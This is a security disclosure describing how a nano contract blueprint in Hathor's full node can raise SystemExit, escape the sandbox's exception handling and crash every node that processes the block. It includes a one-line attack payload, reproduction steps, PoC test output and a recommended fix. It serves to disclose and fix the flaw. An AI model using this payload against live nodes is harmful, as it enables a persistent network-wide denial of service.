# Nano contract blueprint can raise SystemExit and crash the full node

Hathor's nano contract sandbox exposes `SystemExit` as a builtin available to blueprint code (`custom_builtins.py:800`). A blueprint method can call `raise SystemExit()`, and this exception escapes the entire execution pipeline because the exception handlers only catch `Exception` and `NCFail`, never `BaseException` subclasses.

In Python, `SystemExit` inherits from `BaseException`, not `Exception`. So `except Exception` at `metered_exec.py:107` misses it. `except NCFail` at `block_executor.py:248` also misses it. The exception bubbles up to `vertex_handler.py:178` where `except BaseException` catches it and calls `crash_and_exit()`, which runs `reactor.stop(); reactor.crash(); sys.exit(-1)` (`execution_manager.py:65-67`). The same applies to `KeyboardInterrupt` (line 782), `GeneratorExit` (line 774), and `BaseException` itself (line 759). All four are in `EXEC_BUILTINS` and none are in `DISABLED_BUILTINS`. Ironically, the `exit` builtin IS in `DISABLED_BUILTINS` (line 358) with the comment "used to raise SystemExit exception" -- they blocked the function that raises `SystemExit` but left `SystemExit` itself available.

The whole attack is one line of blueprint code: `raise SystemExit()`. When a miner includes a transaction calling this method in a block, every full node that processes it runs the blueprint code, `SystemExit` escapes the sandbox, and the node calls `crash_and_exit()`.

This is not a one time crash. The block gets saved to RocksDB before the exception even propagates. `_unsafe_save_and_run_consensus` (`vertex_handler.py:229`) calls `save_transaction(vertex)` before `unsafe_update` runs consensus and NC execution at line 232. So the block is in storage before `SystemExit` is raised. The `except BaseException` handler at lines 180-182 then writes `CONSENSUS_FAIL_ID` to the block metadata and calls `save_transaction(vertex, only_metadata=True)` before calling `crash_and_exit` at line 183. Any node syncing this chain receives the same block, processes it through vertex_handler, re-executes the NC code, and crashes the same way.

The PoC runs inside hathor-core's own test framework. I set up a full node via `SimulatorTestCase` (real miner, wallet, RocksDB DAG, consensus, vertex handler), deployed a blueprint with `raise SystemExit()`, created a contract, mined blocks to confirm it, then sent a transaction calling `crash_node()` and mined a block that includes it. When `propagate_tx` processed the block, `crash_and_exit` was triggered. I then verified that both the block and the malicious transaction are still in RocksDB after the crash, and that the block is marked with `CONSENSUS_FAIL_ID`. The only mock is `crash_and_exit` itself, since I can't let `sys.exit(-1)` kill the test process. Everything before it runs the real code -- the metadata write at lines 180-182 happens sequentially before `crash_and_exit` at line 183, so the mock doesn't affect it. Run with `-s` to see the step by step output:

```bash
git clone https://github.com/HathorNetwork/hathor-core.git && cd hathor-core
python3.11 -m venv .venv && source .venv/bin/activate && pip install -e ".[dev]"
# place test_systemexit_escape.py at hathor_tests/nanocontracts/
python -m pytest hathor_tests/nanocontracts/test_systemexit_escape.py -s -o "addopts="
```

```
PoC: SystemExit sandbox escape
============================================================
First I checked whether SystemExit is available to blueprint
code. It's in EXEC_BUILTINS (custom_builtins.py:800) and NOT
in DISABLED_BUILTINS:

  'SystemExit' in EXEC_BUILTINS:     True
  'SystemExit' in DISABLED_BUILTINS:  False
  'exit' in DISABLED_BUILTINS:        True

They blocked exit() but not SystemExit itself. Same for the
other BaseException subclasses:
  'BaseException' in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False
  'KeyboardInterrupt' in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False
  'GeneratorExit' in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False

Next I deployed a blueprint with a crash_node() method that
just does `raise SystemExit()`. Sent the initialize() tx and
mined 2 blocks to confirm it:

  contract nc_id: 82e0a78f960d6248...
  token_uid stored in contract: 00
  voided_by: None
  Contract deployed and confirmed.

Then I sent a transaction calling crash_node():

  crash tx hash: 212b6c0d94d3da2a...
  voided_by: None
  Transaction accepted into mempool.

Mined a block that includes the crash_node() transaction.
vertex_handler processes the block, NC execution runs the
blueprint code, SystemExit escapes the sandbox:

  crash_and_exit called: True
  reason: "on_new_vertex() failed for tx db3df2ca..."

Now I checked whether the block and transaction are still in
RocksDB after the crash:

  block in storage:    True
  crash tx in storage: True
  block voided_by:     {b'consensus-fail'}
  has CONSENSUS_FAIL_ID: True

============================================================
Control: sandbox escape vs normal exception
============================================================
Registered a blueprint with `raise SystemExit()` through the
real NC pipeline (BlueprintTestCase, HathorManager, RocksDB).
Called crash_node() via Runner.call_public_method():

  SystemExit escaped the sandbox: True

For comparison, registered a blueprint with `raise ValueError()`.
Called raise_error() via the same Runner.call_public_method():

  ValueError caught as NCFail: True

metered_exec.py:107 catches `except Exception` and wraps it as
NCFail. That works for ValueError because ValueError inherits
from Exception. But SystemExit inherits from BaseException, not
Exception, so it slips past.

2 passed in 5.01s
```

Blueprint deployment is currently restricted to whitelisted addresses (`NC_ON_CHAIN_BLUEPRINT_RESTRICTED = True`), but the code comment at `settings.py:530` says this will be lifted. Localnet already runs with it disabled.

To fix this, remove `SystemExit`, `KeyboardInterrupt`, `BaseException`, and `GeneratorExit` from `EXEC_BUILTINS` and add them to `DISABLED_BUILTINS`. Also change `except Exception` to `except BaseException` in `metered_exec.py:107` as defense in depth.
